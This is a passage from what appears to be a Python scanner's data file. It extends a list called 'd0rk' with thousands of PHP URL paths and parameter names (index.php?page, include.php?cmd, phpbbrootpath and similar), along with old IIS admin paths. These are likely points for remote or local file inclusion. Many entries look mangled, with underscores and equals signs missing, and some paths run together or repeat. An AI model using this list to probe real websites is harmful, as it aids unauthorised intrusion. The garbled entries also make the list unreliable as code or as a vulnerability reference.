	'/general.php?addr', '/general.php?adresa', '/general.php?b', '/general.php?basedir', '/general.php?channel',
	'/general.php?chapter', '/general.php?choix', '/general.php?cmd', '/general.php?content', '/general.php?doshow',
	'/general.php?e', '/general.php?f', '/general.php?get', '/general.php?goto', '/general.php?header',
	'/general.php?id', '/general.php?inc', '/general.php?include', '/general.php?ir', '/general.php?itemnav',
	'/general.php?left', '/general.php?link', '/general.php?menu', '/general.php?menue', '/general.php?mid',
	'/general.php?middle', '/general.php?modo', '/general.php?module', '/general.php?my', '/general.php?nivel',
	'/general.php?o', '/general.php?opcion', '/general.php?p', '/general.php?page', '/general.php?poll',
	'/general.php?pr', '/general.php?pre', '/general.php?qry', '/general.php?read', '/general.php?redirect',
	'/general.php?ref', '/general.php?rub', '/general.php?secao', '/general.php?seccion', '/general.php?second',
	'/general.php?section', '/general.php?seite', '/general.php?sekce', '/general.php?sivu', '/general.php?strona',
	'/general.php?subject', '/general.php?thispage', '/general.php?tipo', '/general.php?to', '/general.php?type',
	'/general.php?var', '/general.php?w', '/general.php?where', '/general.php?xlink', '/glossary.php?term',
	'/gnu/index.php?doc', '/gnu3/index.php?doc', '/hall.php?file', '/hall.php?page', '/handlinger.php?vis',
	'/hcl/inc/pipe.php?HCLpath', '/head.php?[]', '/head.php?abre', '/head.php?adresa', '/head.php?b',
	'/head.php?basedir', '/head.php?c', '/head.php?choix', '/head.php?cmd', '/head.php?content', '/head.php?corpo',
	'/head.php?d', '/head.php?dir', '/head.php?disp', '/head.php?ev', '/head.php?filepath', '/head.php?g',
	'/head.php?goto', '/head.php?inc', '/head.php?incl', '/head.php?include', '/head.php?index', '/head.php?ir',
	'/head.php?ki', '/head.php?lang', '/head.php?left', '/head.php?load', '/head.php?loader', '/head.php?loc',
	'/head.php?middle', '/head.php?middlePart', '/head.php?mod', '/head.php?modo', '/head.php?module',
	'/head.php?numero', '/head.php?oldal', '/head.php?opcion', '/head.php?p', '/head.php?pag', '/head.php?page',
	'/head.php?play', ]
d0rk += ['/head.php?poll', '/head.php?read', '/head.php?ref', '/head.php?rub', '/head.php?sec', '/head.php?sekce',
         '/head.php?sivu', '/head.php?start', '/head.php?str', '/head.php?strona', '/head.php?tipo',
         '/head.php?viewpage', '/head.php?where', '/head.php?y', '/header.php?abspath',
         '/header.php?abspathMobilePublisherPHP', '/help.php?csspath', '/help/faq/inc/pipe.php?HCLpath',
         '/helpcenter/inc/pipe.php?HCLpath', '/helptextvars.php?cmddir&PGVBASEDIRECTORYPHPGedView',
         '/helptextvars.php?cmddir&PGVBASEDIRECTORYPHPGedView<3.3.7', '/helptextvars.php?dir&PGVBASEDIRECTORY',
         '/helpvars.php?cmddir&PGVBASEDIRECTORY', '/historytemplate.php?cms[support]1&cms[tngpath]', '/home.php?',
         '/home.php?a', '/home.php?act', '/home.php?action', '/home.php?addr', '/home.php?arg', '/home.php?basedir',
         '/home.php?basepath', '/home.php?category', '/home.php?channel', '/home.php?chapter', '/home.php?choix',
         '/home.php?cmd', '/home.php?content', '/home.php?disp', '/home.php?doshow', '/home.php?e', '/home.php?ev',
         '/home.php?eval', '/home.php?func', '/home.php?g', '/home.php?h', '/home.php?i', '/home.php?in',
         '/home.php?inc', '/home.php?include', '/home.php?index', '/home.php?ir', '/home.php?itemnav', '/home.php?k',
         '/home.php?link', '/home.php?ln', '/home.php?loader', '/home.php?loc', '/home.php?ltr', '/home.php?menu',
         '/home.php?middle', '/home.php?middlePart', '/home.php?module', '/home.php?my', '/home.php?oldal',
         '/home.php?opcion', '/home.php?pa', '/home.php?pag', '/home.php?page', '/home.php?pagina', '/home.php?panel',
         '/home.php?path', '/home.php?play', '/home.php?poll', '/home.php?pr', '/home.php?pre', '/home.php?qry',
         '/home.php?read', '/home.php?recipe', '/home.php?redirect', '/home.php?ref', '/home.php?rub', '/home.php?sec',
         '/home.php?secao', '/home.php?section', '/home.php?seite', '/home.php?sekce', '/home.php?showpage',
         '/home.php?sit', '/home.php?sp', '/home.php?str', '/home.php?table', '/home.php?thispage', '/home.php?tipo',
         '/home.php?w', '/home.php?where', '/home.php?x', '/home.php?z', '/home1.php?ln', '/home2.php?ln',
         '/homepage.php?sel', '/hosts.dat', '/html&highlight%2527.include$GET[a]exit.%2527&a', '/html/affich.php?base',
         '/html/page.php?page', '/htmltonuke.php?filnavn', '/ideabox/include.php?gorumDir', '/ihm.php?p',
         '/iisadmpwd/achg.htr', '/iisadmpwd/aexp.htr', '/iisadmpwd/aexp2.htr', '/iisadmpwd/aexp2b.htr',
         '/iisadmpwd/aexp3.htr', '/iisadmpwd/aexp4.htr', '/iisadmpwd/aexp4b.htr', '/iisadmpwd/anot.htr',
         '/iisadmpwd/anot3.htr', '/iissamples/exair/howitworks/codebrws.asp', '/iissamples/sdk/asp/docs/codebrws.asp',
         '/image.php?img', '/images/evil.php?owned', '/imall/imall.cgi?p', '/img.php?loc',
         '/impex/ImpExData.php?systempath', '/inc.php?', '/inc.php?addr', '/inc.php?adresa', '/inc.php?basedir',
         '/inc.php?c', '/inc.php?category', '/inc.php?doshow', '/inc.php?ev', '/inc.php?get', '/inc.php?i',
         '/inc.php?inc', '/inc.php?incl', '/inc.php?include', '/inc.php?j', '/inc.php?k', '/inc.php?ki',
         '/inc.php?left', '/inc.php?link', '/inc.php?m', '/inc.php?menu', '/inc.php?modo', '/inc.php?open',
         '/inc.php?pg', '/inc.php?rub', '/inc.php?showpage', '/inc.php?sivu', '/inc.php?start', '/inc.php?str',
         '/inc.php?to', '/inc.php?type', '/inc.php?y', '/inc/authform.inc.php?pathpre',
         '/inc/cmses/aedating4CMS.php?dir[inc]', '/inc/cmses/aedatingCMS.php?dir[inc]',
         '/inc/functions.inc.php?config[pparootpath]', '/inc/header.php/stepone.php?serverinc',
         '/inc/irayofuncs.php?irayodirhack', '/inc/irayofuncs.php?irayodirhack/inc/', '/inc/pipe.php?HCLpath',
         '/inc/session.php?sessionerror0&lang', '/inc/shows.inc.php?cutepath', '/inc/steponetables.php?serverinc',
         '/include.php?', '/include.php?[]', '/include.php?adresa', '/include.php?b', '/include.php?basepath',
         '/include.php?channel', '/include.php?chapter', '/include.php?cmd', '/include.php?cont',
         '/include.php?content', '/include.php?corpo', '/include.php?destino', '/include.php?dir', '/include.php?eval',
         '/include.php?filepath', '/include.php?go', '/include.php?goFile', '/include.php?goto', '/include.php?header',
         '/include.php?in', '/include.php?include', '/include.php?index', '/include.php?ir', '/include.php?ki',
         '/include.php?left', '/include.php?loader', '/include.php?loc', '/include.php?mid', '/include.php?middle',
         '/include.php?middlePart', '/include.php?module', '/include.php?my', '/include.php?nivel',
         '/include.php?numero', '/include.php?oldal', '/include.php?option', '/include.php?pag', '/include.php?page',
         '/include.php?panel', '/include.php?path', '/include.php?path[docroot]', '/include.php?phpbbrootpath',
         '/include.php?play', '/include.php?read', '/include.php?redirect', '/include.php?ref', '/include.php?sec',
         '/include.php?secao', '/include.php?seccion', '/include.php?second', '/include.php?sivu', '/include.php?tipo',
         '/include.php?to', '/include.php?u', '/include.php?url', '/include.php?w', '/include.php?x',
         '/include/authform.inc.php?pathpre', '/include/editfunc.inc.php?NWCONFSYSTEM[serverpath]',
         '/include/footer.inc.php?AMLconfig[cfgserverpath]', '/include/init.inc.php?CPGMDIR',
         '/include/livreinclude.php?noconnectlol&chemabsolu', '/include/main.php?config[searchdisp]true&includedir', ]
d0rk += ['/include/newvisitor.inc.php?lvcincludedir', '/include/write.php?dir',
         '/includes/archive/archivetopic.php?phpbbrootpath', '/includes/calendar.php?phpcrootpath',
         '/includes/dbal.php?eqdkprootpath', '/includes/dbal.php?eqdkprootpathEQdkp',
         '/includes/dbal.php?eqdkprootpathpoweredbyEQdkp', '/includes/functions.php?phpbbrootpath',
         '/includes/functionsportal.php?phpbbrootpath', '/includes/header.php?systempath',
         '/includes/includeonce.php?includefile', '/includes/includeonde.php?includefile',
         '/includes/kbconstants.php?modulerootpath', '/includes/kbconstants.php?modulerootpathBase',
         '/includes/kbconstants.php?modulerootpathKnowledge', '/includes/kbconstants.php?modulerootpathKnowledgeBase',
         '/includes/kbconstants.php?modulerootpathPoweredbyKnowledgeBase', '/includes/lang/.php?pathtoroot',
         '/includes/mxfunctionsch.php?phpbbrootpath', '/includes/openid/Auth/OpenID/BBStore.php?openidrootpath',
         '/includes/orderSuccess.inc.php?glob1&cartorderid1&glob[rootDir]',
         '/includes/orderSuccess.inc.php?glob1&cartorderid1&glob[rootDir]/class.mysql.php?pathtobtdir/include/footer.inc.php?AMLconfig[cfgserverpath]',
         '/includes/search.php?GlobalSettings[templatesDirectory]', '/includes/setup.php?phpcrootpath',
         '/index.inc.php?PATHIncludes', '/index.php/main.php?x', '/index.php3?act', '/index.php3?file', '/index.php3?i',
         '/index.php3?id', '/index.php3?l', '/index.php3?lang', '/index.php3?p', '/index.php3?pag', '/index.php3?page',
         '/index.php3?pg', '/index.php3?s', '/index.php4?lang', '/index.php5?lang', '/index.php?', '/index.php?L2',
         '/index.php?Load',
         '/index.php?REQUEST&REQUEST%5boption%5dcomcontent&REQUEST%5bItemid%5d1&GLOBALS&mosConfigabsolutepath',
         '/index.php?REQUEST&REQUEST[option]comcontent&REQUEST[Itemid]1&GLOBALS&mosConfigabsolutepath',
         '/index.php?RPPATH', '/index.php?TWC', '/index.php?a', '/index.php?acao', '/index.php?act',
         '/index.php?action', '/index.php?addr', '/index.php?adresa', '/index.php?arg', '/index.php?arq',
         '/index.php?arquivo', '/index.php?b', '/index.php?ba', '/index.php?babInstPath', '/index.php?babInstallPath',
         '/index.php?bas', '/index.php?base', '/index.php?basedir', '/index.php?basepath', '/index.php?c',
         '/index.php?cal', '/index.php?canal', '/index.php?cat', '/index.php?channel', '/index.php?chapter',
         '/index.php?classifiedpath', '/index.php?cmd', '/index.php?cms', '/index.php?cms/index.php?cms',
         '/index.php?command', '/index.php?configFile', '/index.php?cont', '/index.php?content', '/index.php?conteudo',
         '/index.php?d1', '/index.php?def', '/index.php?dept', '/index.php?disp', '/index.php?dn',
         '/index.php?dn/index.php?dn', '/index.php?dnindex.php?dn', '/index.php?dnphp?dn', '/index.php?do',
         '/index.php?doc', '/index.php?dok', '/index.php?dsp', '/index.php?e', '/index.php?ev', '/index.php?exec',
         '/index.php?f', '/index.php?f1', '/index.php?fPage', '/index.php?fase', '/index.php?field', '/index.php?file',
         '/index.php?filepath', '/index.php?filesite.dk', '/index.php?fn', '/index.php?frommarketY&pageurl',
         '/index.php?fset', '/index.php?func', '/index.php?functioncustom&custom', '/index.php?go', '/index.php?go1',
         '/index.php?goto', '/index.php?hl', '/index.php?id&lang', '/index.php?id&langindex.php?id',
         '/index.php?id&langphp?id', '/index.php?id&page', '/index.php?id&pageindex.php?id', '/index.php?id&pagephp?id',
         '/index.php?id1&lang', '/index.php?inc', '/index.php?incl', '/index.php?include', '/index.php?index',
         '/index.php?inhalt', '/index.php?interurl', '/index.php?ir', '/index.php?j', '/index.php?kobr', '/index.php?l',
         '/index.php?lang&page', '/index.php?lang', '/index.php?langc', '/index.php?langen&cat',
         '/index.php?langen&catindex.php?lang', '/index.php?langen&catphp?lang', '/index.php?langen&page',
         '/index.php?langen&pageindex.php?lang', '/index.php?langen&pagephp?lang', '/index.php?langgr&file',
         '/index.php?level', '/index.php?lg', '/index.php?link', '/index.php?lk', '/index.php?ln', '/index.php?lng',
         '/index.php?lnk', '/index.php?lnphp?ln', '/index.php?loc&cat', '/index.php?loc&catindex.php?loc',
         '/index.php?loc&catphp?loc', '/index.php?loc&lang', '/index.php?loc&langindex.php?loc',
         '/index.php?loc&langphp?loc', '/index.php?loc&page', '/index.php?loc&pageindex.php?loc', '/index.php?loc',
         '/index.php?loca', '/index.php?locphp?loc', '/index.php?locstart&page',
         '/index.php?locstart&pageindex.php?loc', '/index.php?ltr', '/index.php?m', '/index.php?main',
         '/index.php?meio', '/index.php?meio.php', '/index.php?menu', '/index.php?menudeti&page', '/index.php?mf',
         '/index.php?mid', '/index.php?middle', '/index.php?middlePart', '/index.php?mn', '/index.php?mod',
         '/index.php?mode', '/index.php?modo', '/index.php?module', '/index.php?myContent', '/index.php?new',
         '/index.php?news', '/index.php?nic', '/index.php?oldal', '/index.php?op', '/index.php?opcao',
         '/index.php?opcion', '/index.php?open', '/index.php?openfile', '/index.php?option', '/index.php?ort',
         '/index.php?p', '/index.php?pag', '/index.php?page&lang', '/index.php?page', '/index.php?page1',
         '/index.php?pageN', '/index.php?pager', '/index.php?pagesite.dk', '/index.php?pageurl', '/index.php?pagina',
         '/index.php?pagina1', '/index.php?param']
d0rk += ['/index.php?path', '/index.php?pg', '/index.php?pgID', '/index.php?pilih', '/index.php?place',
         '/index.php?play', '/index.php?plugin', '/index.php?poll', '/index.php?pr', '/index.php?pre',
         '/index.php?pref', '/index.php?principal', '/index.php?prod', '/index.php?product', '/index.php?r',
         '/index.php?rage', '/index.php?recipe', '/index.php?redir', '/index.php?rootpath', '/index.php?s',
         '/index.php?screen', '/index.php?sec', '/index.php?secao', '/index.php?seccion',
         '/index.php?seccion/index.php?seccion', '/index.php?seccionphp?seccion', '/index.php?seite',
         '/index.php?seite/index.php?seite', '/index.php?seitephp?seite', '/index.php?sekce', '/index.php?sel',
         '/index.php?select', '/index.php?set', '/index.php?sf', '/index.php?show', '/index.php?side', '/index.php?sit',
         '/index.php?site', '/index.php?site1', '/index.php?sivu', '/index.php?skinfile', '/index.php?slang',
         '/index.php?slang/index.php?slang', '/index.php?slangindex.php?slang', '/index.php?slangphp?slang',
         '/index.php?sort', '/index.php?spage', '/index.php?ss', '/index.php?st', '/index.php?str',
         '/index.php?stranica', '/index.php?strona', '/index.php?sub', '/index.php?subp', '/index.php?subpage',
         '/index.php?t', '/index.php?table', '/index.php?task', '/index.php?template', '/index.php?templateid',
         '/index.php?term', '/index.php?theme', '/index.php?themesdir', '/index.php?tipo', '/index.php?to',
         '/index.php?topic', '/index.php?trans', '/index.php?type', '/index.php?u', '/index.php?url', '/index.php?v',
         '/index.php?var', '/index.php?var1', '/index.php?var2', '/index.php?ver', '/index.php?vis',
         '/index.php?vis/index.php?vis', '/index.php?visphp?vis', '/index.php?visualizar', '/index.php?vpagina',
         '/index.php?w', '/index.php?way', '/index.php?where', '/index.php?wpage', '/index.php?x', '/index.php?y',
         '/index.php?z', '/index.phpmain.php?x', '/index0.php?show', '/index1.php?', '/index1.php?OpenPage',
         '/index1.php?[]', '/index1.php?abre', '/index1.php?action', '/index1.php?adresa', '/index1.php?arg',
         '/index1.php?arq', '/index1.php?b', '/index1.php?c', '/index1.php?chapter', '/index1.php?choix',
         '/index1.php?cmd', '/index1.php?d', '/index1.php?dat', '/index1.php?dir', '/index1.php?filepath',
         '/index1.php?func', '/index1.php?get', '/index1.php?go', '/index1.php?goFile', '/index1.php?home',
         '/index1.php?inc', '/index1.php?incl', '/index1.php?itemnav', '/index1.php?l', '/index1.php?link',
         '/index1.php?lk', '/index1.php?ln', '/index1.php?lnphp?ln', '/index1.php?load', '/index1.php?loc',
         '/index1.php?ltr', '/index1.php?main', '/index1.php?menu', '/index1.php?mid', '/index1.php?mod',
         '/index1.php?modo', '/index1.php?my', '/index1.php?nav', '/index1.php?nivel', '/index1.php?o',
         '/index1.php?oldal', '/index1.php?op', '/index1.php?p', '/index1.php?pa', '/index1.php?page',
         '/index1.php?pagina', '/index1.php?param', '/index1.php?path', '/index1.php?pg', '/index1.php?poll',
         '/index1.php?pr', '/index1.php?pre', '/index1.php?qry', '/index1.php?read', '/index1.php?recipe',
         '/index1.php?redirect', '/index1.php?root', '/index1.php?s', '/index1.php?second', '/index1.php?seite',
         '/index1.php?sekce', '/index1.php?show', '/index1.php?showpage', '/index1.php?site', '/index1.php?str',
         '/index1.php?strona', '/index1.php?subject', '/index1.php?t', '/index1.php?table', '/index1.php?tipo',
         '/index1.php?type', '/index1.php?url', '/index1.php?v', '/index1.php?var', '/index1.php?x', '/index2.php?',
         '/index2.php?DoAction', '/index2.php?ID', '/index2.php?OpenPage', '/index2.php?action', '/index2.php?adresa',
         '/index2.php?arg', '/index2.php?arq', '/index2.php?asciiseite', '/index2.php?basedir', '/index2.php?basepath',
         '/index2.php?c', '/index2.php?category', '/index2.php?channel', '/index2.php?chapter', '/index2.php?choix',
         '/index2.php?cmd', '/index2.php?cont', '/index2.php?content', '/index2.php?corpo', '/index2.php?d',
         '/index2.php?doshow', '/index2.php?e', '/index2.php?f', '/index2.php?filepath', '/index2.php?get',
         '/index2.php?goto', '/index2.php?home', '/index2.php?i', '/index2.php?in', '/index2.php?inc',
         '/index2.php?incl', '/index2.php?include', '/index2.php?ir', '/index2.php?itemnav', '/index2.php?ki',
         '/index2.php?l', '/index2.php?left', '/index2.php?lg', '/index2.php?link', '/index2.php?lk', '/index2.php?ln',
         '/index2.php?lng', '/index2.php?load', '/index2.php?loader', '/index2.php?loc', '/index2.php?loca',
         '/index2.php?meio', '/index2.php?menu', '/index2.php?module', '/index2.php?my', '/index2.php?o',
         '/index2.php?oldal', '/index2.php?open', '/index2.php?option', '/index2.php?p', '/index2.php?pa',
         '/index2.php?pag', '/index2.php?page', '/index2.php?param', '/index2.php?pg', '/index2.php?phpbbrootpath',
         '/index2.php?poll', '/index2.php?pre', '/index2.php?pref', '/index2.php?qry', '/index2.php?recipe',
         '/index2.php?redirect', '/index2.php?ref', '/index2.php?rub', '/index2.php?s', '/index2.php?second',
         '/index2.php?section', '/index2.php?sekce', '/index2.php?showpage', '/index2.php?strona', '/index2.php?table',
         '/index2.php?thispage', '/index2.php?to', '/index2.php?type', '/index2.php?u', '/index2.php?urlpage',
         '/index2.php?var', '/index2.php?x', '/index3.php?', '/index3.php?abre']
d0rk += ['/index3.php?addr', '/index3.php?adresa', '/index3.php?basedir', '/index3.php?channel', '/index3.php?chapter',
         '/index3.php?choix', '/index3.php?cmd', '/index3.php?d', '/index3.php?destino', '/index3.php?dir',
         '/index3.php?disp', '/index3.php?ev', '/index3.php?get', '/index3.php?go', '/index3.php?home',
         '/index3.php?inc', '/index3.php?include', '/index3.php?index', '/index3.php?ir', '/index3.php?itemnav',
         '/index3.php?left', '/index3.php?link', '/index3.php?loader', '/index3.php?menue', '/index3.php?mid',
         '/index3.php?middle', '/index3.php?mod', '/index3.php?my', '/index3.php?nivel', '/index3.php?oldal',
         '/index3.php?open', '/index3.php?option', '/index3.php?p', '/index3.php?pag', '/index3.php?page',
         '/index3.php?panel', '/index3.php?path', '/index3.php?phpbbrootpath', '/index3.php?poll', '/index3.php?pre',
         '/index3.php?pref', '/index3.php?q', '/index3.php?read', '/index3.php?redirect', '/index3.php?ref',
         '/index3.php?rub', '/index3.php?secao', '/index3.php?secc', '/index3.php?seccion', '/index3.php?second',
         '/index3.php?sekce', '/index3.php?showpage', '/index3.php?sivu', '/index3.php?sp', '/index3.php?start',
         '/index3.php?t', '/index3.php?thispage', '/index3.php?tipo', '/index3.php?type', '/index3.php?url',
         '/index3.php?var', '/index3.php?x', '/index3.php?xlink', '/index4.php?body', '/indexprincipal.php?pagina',
         '/info.php?', '/info.php?[]', '/info.php?adresa', '/info.php?basedir', '/info.php?c', '/info.php?chapter',
         '/info.php?content', '/info.php?doshow', '/info.php?ev', '/info.php?eval', '/info.php?f', '/info.php?filepath',
         '/info.php?go', '/info.php?header', '/info.php?home', '/info.php?in', '/info.php?incl', '/info.php?ir',
         '/info.php?itemnav', '/info.php?j', '/info.php?ki', '/info.php?l', '/info.php?ln', '/info.php?loader',
         '/info.php?menue', '/info.php?mid', '/info.php?middlePart', '/info.php?o', '/info.php?oldal', '/info.php?op',
         '/info.php?opcion', '/info.php?option', '/info.php?p', '/info.php?page', '/info.php?pagina', '/info.php?param',
         '/info.php?phpbbrootpath', '/info.php?pref', '/info.php?r', '/info.php?read', '/info.php?recipe',
         '/info.php?redirect', '/info.php?ref', '/info.php?rub', '/info.php?sec', '/info.php?secao',
         '/info.php?seccion', '/info.php?start', '/info.php?strona', '/info.php?subject', '/info.php?t',
         '/info.php?url', '/info.php?var', '/info.php?xlink', '/info.php?z',
         '/install/index.php?lng./../include/main.inc&GPATH', '/intern/admin/?rootdir',
         '/intern/admin/other/backup.php?admin1&rootdir', '/intern/clan/memberadd.php?rootdir',
         '/intern/config/forum.php?rootdir', '/intern/config/key2.php?rootdir', '/interna.php?meio',
         '/interna.php?meiophp?meio', '/interna/tinymce/plugins/ibrowser/ibrowser.php?tinyMCEimglibinclude',
         '/jaf/index.php?show', '/jobs.cgi?a9&t', '/joomla/index.php?optioncomrestaurante&task',
         '/jscript.php?myms[root]', '/kalender.php?vis', '/kietu/index.php?kietu[urlhit]', '/lang.php?arg',
         '/lang.php?arq', '/lang.php?lk', '/lang.php?ln', '/lang.php?subp', '/lang.php?subpage', '/latinbitz.cgi?t',
         '/layout.php?OpenPage', '/layout.php?abre', '/layout.php?action', '/layout.php?addr', '/layout.php?basepath',
         '/layout.php?c', '/layout.php?category', '/layout.php?chapter', '/layout.php?choix', '/layout.php?cmd',
         '/layout.php?cont', '/layout.php?disp', '/layout.php?g', '/layout.php?goto', '/layout.php?incl',
         '/layout.php?ir', '/layout.php?link', '/layout.php?loader', '/layout.php?menue', '/layout.php?modo',
         '/layout.php?my', '/layout.php?nivel', '/layout.php?numero', '/layout.php?oldal', '/layout.php?opcion',
         '/layout.php?page', '/layout.php?pagina', '/layout.php?panel', '/layout.php?path', '/layout.php?play',
         '/layout.php?poll', '/layout.php?pref', '/layout.php?qry', '/layout.php?secao', '/layout.php?section',
         '/layout.php?seite', '/layout.php?sekce', '/layout.php?strona', '/layout.php?thispage', '/layout.php?tipo',
         '/layout.php?url', '/layout.php?var', '/layout.php?where', '/layout.php?xlink', '/layout.php?z',
         '/layouts/settings', '/lc.cgi?a', '/lib/base.php?BaseCfg[BaseDir]', '/lib/db/ezsql.php?libpath',
         '/lib/db/ezsql.php?libpathttCMS', '/lib/db/ezsql.php?libpathttCMS<v4', '/lib/functions.php?DOCROOT',
         '/lib/gore.php?libpath', '/lib/header.php?DOCROOT', '/lib/static/header.php?setmenu',
         '/lib/static/header.php?setmenuiPhotoAlbum', '/lib/static/header.php?setmenuiPhotoAlbumv1.1',
         '/library/editor/editor.php?root', '/library/lib.php?root', '/link.php?do', '/lire.php?rub',
         '/list.php?product', '/list.php?table', '/livehelp/inc/pipe.php?HCLpath', '/livesupport/inc/pipe.php?HCLpath',
         '/llindex.php?sub', '/ln.php?ln', '/loc.php?l', '/loc.php?lang', '/loc.php?loc', '/log.nsf', '/login.php?dir',
         '/login.php?dirlogin.php?dir', '/login.php?loca', '/m2f/m2fphpbb204.php?m2frootpath', '/magazine.php?inc',
         '/mai.php?act', '/mai.php?loc', '/mai.php?src', '/main.html.php?seite', '/main.php3?act', '/main.php5?page',
         '/main.php?', '/main.php?a', '/main.php?action', '/main.php?addr', '/main.php?adresa', '/main.php?arg',
         '/main.php?ba', '/main.php?basepath', '/main.php?body', '/main.php?category', '/main.php?chapter',
         '/main.php?command', '/main.php?content', '/main.php?corpo', '/main.php?d1']
d0rk += ['/main.php?dir', '/main.php?disp', '/main.php?doshow', '/main.php?e', '/main.php?eval', '/main.php?f1',
         '/main.php?filepath', '/main.php?fset', '/main.php?goto', '/main.php?h', '/main.php?id', '/main.php?inc',
         '/main.php?include', '/main.php?index', '/main.php?ir', '/main.php?itemnav', '/main.php?j', '/main.php?link',
         '/main.php?ln', '/main.php?load', '/main.php?loc', '/main.php?ltr', '/main.php?middle', '/main.php?mod',
         '/main.php?my', '/main.php?oldal', '/main.php?opcion', '/main.php?p', '/main.php?page', '/main.php?pagina',
         '/main.php?param', '/main.php?path', '/main.php?pg', '/main.php?pre', '/main.php?pref', '/main.php?r',
         '/main.php?ref', '/main.php?s', '/main.php?sayfa', '/main.php?sayfamain.php?sayfa', '/main.php?second',
         '/main.php?section', '/main.php?sit', '/main.php?site', '/main.php?start', '/main.php?str', '/main.php?strona',
         '/main.php?subject', '/main.php?table', '/main.php?thispage', '/main.php?tipo', '/main.php?type',
         '/main.php?url', '/main.php?v', '/main.php?view', '/main.php?vis', '/main.php?where', '/main.php?x',
         '/main.php?xlink', '/main1.php?arg', '/main1.php?ln', '/main2.php?ln', '/mainfile.php?MAINPATH',
         '/mainsite.php?page', '/mambots/content/multithumb/multithumb.php?mosConfigabsolutepath',
         '/manage/cgi/cgiproc', '/manager/admin/index.php?MGR', '/manager/admin/pins.php?MGR',
         '/manager/admin/uins.php?MGR', '/map.php?loc', '/mcf.php?content', '/mcf.php?contentmcf.php',
         '/media.cgi?a11&t', '/media.php?page', '/mediagallery/publichtml/maint/ftpmedia.php?MGCONF[pathhtml]',
         '/menu.php?functionsfile', '/middle.php?file', '/middle.php?page', '/misc.php?do', '/mod.php?OpenPage',
         '/mod.php?action', '/mod.php?addr', '/mod.php?b', '/mod.php?channel', '/mod.php?chapter', '/mod.php?choix',
         '/mod.php?cont', '/mod.php?content', '/mod.php?corpo', '/mod.php?d', '/mod.php?destino', '/mod.php?dir',
         '/mod.php?ev', '/mod.php?goFile', '/mod.php?home', '/mod.php?incl', '/mod.php?include', '/mod.php?index',
         '/mod.php?ir', '/mod.php?j', '/mod.php?lang', '/mod.php?link', '/mod.php?m', '/mod.php?middle', '/mod.php?mod',
         '/mod.php?module', '/mod.php?numero', '/mod.php?oldal', '/mod.php?p', '/mod.php?pag', '/mod.php?page',
         '/mod.php?pagina', '/mod.php?path', '/mod.php?pg', '/mod.php?phpbbrootpath', '/mod.php?play', '/mod.php?pre',
         '/mod.php?qry', '/mod.php?recipe', '/mod.php?secao', '/mod.php?secc', '/mod.php?seccion', '/mod.php?section',
         '/mod.php?sekce', '/mod.php?start', '/mod.php?strona', '/mod.php?thispage', '/mod.php?tipo', '/mod.php?to',
         '/mod.php?v', '/mod.php?var', '/modcp/intextModeratorvBulletin', '/modifyform.html?code', '/modul.php?mod',
         '/module.php?mod', '/moduledb.php?pivotpath', '/modules.php?name', '/modules.php?op',
         '/modules/4nAlbum/public/displayCategory.php?basepath',
         '/modules/AllMyGuests/signin.php?AMGconfig[cfgserverpath]',
         '/modules/Discipline/CategoryBreakdownTime.php?FocusPath',
         '/modules/Discipline/CategoryBreakdownTime.php?staticpath',
         '/modules/Discipline/StudentFieldBreakdown.php?staticpath',
         '/modules/Forums/admin/admindbutilities.php?phpbbrootpath',
         '/modules/Forums/admin/adminstyles.php?phpbbrootpath', '/modules/MyGuests/signin.php?AMGconfig[cfgserverpath]',
         '/modules/MyeGallery/index.php?basepath', '/modules/MyeGallery/public/displayCategory.php?basepath',
         '/modules/MyeGery/public/displayCategory.php?basepath',
         '/modules/PNphpBB2/includes/functionsadmin.php?phpbbrootpath', '/modules/TotalCalendar/about.php?incdir',
         '/modules/TotalCalendar/about.php?incdir/TotalCalendar',
         '/modules/TotalCalendar/about.php?incdirTotalCalendar', '/modules/addons/plugin.php?docroot',
         '/modules/agendax/addevent.inc.php?agendaxpath', '/modules/coppermine/include/init.inc.php?CPGMDIR',
         '/modules/coppermine/themes/coppercop/theme.php?THEMEDIR',
         '/modules/coppermine/themes/coppercop/theme.php?THEMEDIRcoppermine',
         '/modules/coppermine/themes/coppercop/theme.php?THEMEDIRcopperminemwchat/libs/startlobby.php?CONFIG[MWCHATLibs]',
         '/modules/coppermine/themes/default/theme.php?THEMEDIR', '/modules/kernel/system/startup.php?CFGPHPGIGGLEROOT',
         '/modules/kernel/system/startup.php?CFGPHPGIGGLEROOTCFGPHPGIGGLEROOT',
         '/modules/links/showlinks.php?home&rootdpzZz&gs', '/modules/links/submitlinks.php?rootdpzZz&gs',
         '/modules/modmainmenu.php?mosConfigabsolutepath',
         '/modules/newbbplus/class/forumpollrenderer.php?bbPath[path]',
         '/modules/poll/inlinepoll.php?home&rootdpzZz&gs', '/modules/poll/showpoll.php?home&rootdpzZz&gs',
         '/modules/postguestbook/styles/internal/header.php?tplpgbmoddir',
         '/modules/postguestbook/styles/internal/header.php?tplpgbmoddirPostGuestbook',
         '/modules/postguestbook/styles/internal/header.php?tplpgbmoddirPostGuestbook0.6.1',
         '/modules/search/search.php?home&rootdpzZz&gs', '/modules/tasks/viewgantt.php?rootdir',
         '/modules/vwar/admin/admin.php?vwarroot', '/modules/vwar/admin/admin.php?vwarrootindex.php?loc',
         '/modules/vwar/admin/admin.php?vwarrootvwar', '/modules/vwar/convert/mvcwconver.php?step1&vwarroot',
         '/modules/xgallery/upgradealbum.php?GALLERYBASEDIR', '/modules/xgery/upgradealbum.php?GERYBASEDIR',
         '/modules/xoopsgallery/upgradealbum.php?GALLERYBASEDIR']
d0rk += ['/modules/xoopsgery/upgradealbum.php?GERYBASEDIR', '/more.php?sub', '/msadc/Samples/SELECTOR/codebrws.cfm',
         '/msadc/Samples/SELECTOR/showcode.asp', '/msadc/msadcs.dll', '/msadc/samples/adctest.asp',
         '/msads/samples/selector/showcode.asp', '/mwchat/libs/startlobby.php?CONFIG[MWCHATLibs]',
         '/myPHPCalendar/admin.php?caldir', '/myevent.php?myeventpath',
         '/mylinks/include/footer.inc.php?AMLconfig[cfgserverpath]',
         '/mylinks/include/info.inc.php?AMVconfig[cfgserverpath]', '/names.nsf', '/nav.php?g', '/nav.php?go',
         '/nav.php?lk', '/nav.php?ln', '/nav.php?loc', '/nav.php?nav', '/nav.php?p', '/nav.php?pag', '/nav.php?page',
         '/nav.php?pagina', '/nav.php?pg', '/ncaster/admin/addons/archive/archive.php?adminfolder', '/ndex.php?p',
         '/newbb/print.php?forumtopicid', '/newbbplus/', '/news.cgi?a114&t', '/news.cgi?alatest&t', '/news.cgi?t',
         '/news.php?CONFIG[scriptpath]', '/news/archive.php?opyearmonth', '/news/newstopicinc.php?indir',
